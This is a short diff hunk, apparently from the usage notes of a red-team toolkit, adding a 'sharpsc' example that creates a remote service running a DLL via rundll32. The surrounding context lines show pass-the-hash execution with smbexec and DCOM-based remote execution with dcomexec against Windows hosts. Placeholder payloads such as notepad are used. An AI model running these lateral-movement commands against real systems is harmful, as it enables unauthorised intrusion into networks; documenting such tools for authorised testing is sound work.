@@ -165,6 +165,7 @@ smbexec -t 10.0.0.1 -u admin -d domain -h <nthash> -c "rundll32 c:\\users\\publi
 dcomexec -t 10.0.0.1 -m mmc -c c:\\windows\\system32\\cmd.exe -a "/c notepad.exe"
 dcomexec -t 10.0.0.1 -m shellbrowserwindow -c c:\\windows\\system32\\cmd.exe -a "/c notepad.exe"
 dcomexec -t 10.0.0.1 -m shellwindows -c c:\\windows\\system32\\cmd.exe -a "/c notepad.exe"
+sharpsc SERVER01 service "cmd /c rundll32.exe test.dll,Ep" domain username password
 
 Socks:
 ======
